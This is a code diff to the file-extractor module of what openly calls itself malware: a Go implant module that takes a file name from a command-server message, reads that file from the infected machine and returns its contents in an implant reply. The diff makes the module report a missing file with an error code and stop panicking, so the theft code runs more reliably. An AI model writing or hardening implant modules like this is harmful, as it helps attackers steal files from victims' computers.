@@ -2,7 +2,6 @@ package file_extractor
 
 import (
 	"io/ioutil"
-	"malware/common"
 	"malware/common/messages"
 	"malware/common/types"
 )
@@ -21,18 +20,19 @@ func Create() types.Module {
 	return settings{&state}
 }
 
-func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) {
+func (settings settings) HandleMessage(message *messages.CheckCmdReply, callback func(*messages.ImplantReply)) bool {
 	file := message.GetGetfile()
 	if file == nil {
-		return
+		return false
 	}
 
 	out, err := ioutil.ReadFile(file.Filename)
 	if err != nil {
-		common.Panicf(err, "Erroring loading file")
+		callback(&messages.ImplantReply{Module: settings.ID(), Error: types.ERR_FILE_NOT_FOUND})
+	} else {
+		callback(&messages.ImplantReply{Module: settings.ID(), Args: out})
 	}
-
-	callback(&messages.ImplantReply{Module: settings.ID(), Args: out})
+	return true
 }
 
 // Init the state of this module
